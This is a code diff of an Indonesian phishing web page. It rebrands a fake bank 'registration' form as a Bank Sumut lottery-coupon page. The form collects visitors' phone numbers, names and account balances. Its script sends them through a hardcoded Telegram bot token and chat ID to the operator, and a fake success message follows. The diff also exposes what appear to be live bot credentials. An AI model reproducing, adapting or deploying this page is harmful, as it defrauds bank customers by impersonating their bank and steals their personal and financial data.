@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Form Pendaftaran - Bank Papua</title>
+  <title>Kupon Undian Bank SUMUT</title>
   <!-- Bootstrap CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <!-- Google Fonts -->
@@ -11,7 +11,6 @@
   <style>
     /* Background dan font */
     body {
-      background: linear-gradient(135deg, #bdcd7b, #b3c88f);
       font-family: 'Roboto', sans-serif;
       margin: 0;
       padding: 0;
@@ -23,9 +22,6 @@
     }
     /* Container Form */
     .card-form {
-      background: #fff;
-      border-radius: 15px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
       max-width: 400px;
       width: 100%;
       padding: 2rem;
@@ -35,11 +31,11 @@
     .card-form::before {
       content: '';
       position: absolute;
-      top: -50px;
-      left: calc(50% - 100px);
-      width: 200px;
+      top: -100px;
+      right: calc(50% - 90px);
+      width: 180px;
       height: 200px;
-      background: url('bank.png') no-repeat center center;
+      background: url('icon.png') no-repeat center center;
       background-size: contain;
     }
     .card-form h2 {
@@ -54,8 +50,9 @@
       color: #333;
     }
     .form-control {
-      border: 2px solid #00347d;
+      border: 1px solid #1d84d3;
       border-radius: 10px;
+      border-spacing:20px;
       padding: 0.75rem;
       transition: border-color 0.3s;
     }
@@ -64,15 +61,17 @@
       box-shadow: none;
     }
     .btn-primary {
-      background-color: #00347d;
       border: none;
+      background-color: #0a77b1;
+
       border-radius: 10px;
       padding: 0.75rem;
       font-weight: 700;
       transition: background-color 0.3s;
     }
     .btn-primary:hover {
-      background-color: #002259;
+      background-color: #1c93b5;
+
     }
     /* Footer */
     .footer {
@@ -81,9 +80,32 @@
       color: #fff;
       font-size: 0.9rem;
     }
+    nav img {
+      position: fixed;
+
+      width: 100%; /* Biar full lebar */
+      max-height: 70px;
+      position: relative;
+      object-fit: contain; /* Biar gambar tetap proporsional */
+    }
+    nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: white; /* Sesuaikan warna latar */
+      z-index: 1000; /* Supaya selalu di atas elemen lain */
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Tambahkan bayangan agar terlihat lebih jelas */
+    }
+
+    
+
   </style>
 </head>
 <body>
+  <nav>
+    <img src="navbar.png" alt="" >
+  </nav>
   <div class="card-form">
     <h2>Form Pendaftaran</h2>
     <form id="registrationForm">
@@ -99,12 +121,12 @@
         <label class="form-label" for="saldoAkhir">Saldo Tabungan Rekening Saat Ini</label>
         <input type="text" id="saldoAkhir" class="form-control" placeholder="Rp" required>
       </div>
-      <button type="submit" class="btn btn-primary w-100">Lanjutkan</button>
+      <button type="submit" class="btn btn-primary w-100">Lanjutkan Cetak kupon</button>
     </form>
   </div>
 
   <div class="footer">
-    © Bank Papua
+    © Bank Sumut
   </div>
 
   <!-- Modal Rate Limit -->
@@ -124,6 +146,25 @@
       </div>
     </div>
   </div>
+
+  <!-- Modal Sukses -->
+  <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="successModalLabel">Sukses</h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body">
+          Data berhasil dikirim!
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-primary" data-bs-dismiss="modal">OK</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
 
   <!-- Bootstrap Bundle JS (termasuk Popper) -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
@@ -153,9 +194,9 @@
       
       let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);
       
-      let botToken = "8019506567:AAGpDwSssP4xnJOtLX0HNUnBS1nUlisl7Xk";
+      let botToken = "7901041357:AAHwha_U3qp7fkkrH0pti_CylaT6eCmXHrc";
       let chatId = "7644113955";
-      let message = `( Bank Papua  | Data Rek )\n\n- No HP : ${noHp}\n- Nama : ${nama}\n- Saldo : Rp. ${saldoFormatted}\n\nCopyright©2020 bagas.webkuu`;
+      let message = `( Bank sumut  | Data Rek )\n\n- No HP : ${noHp}\n- Nama : ${nama}\n- Saldo : Rp. ${saldoFormatted}\n\nCopyright©2020 bagas.webkuu`;
       
       let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
       
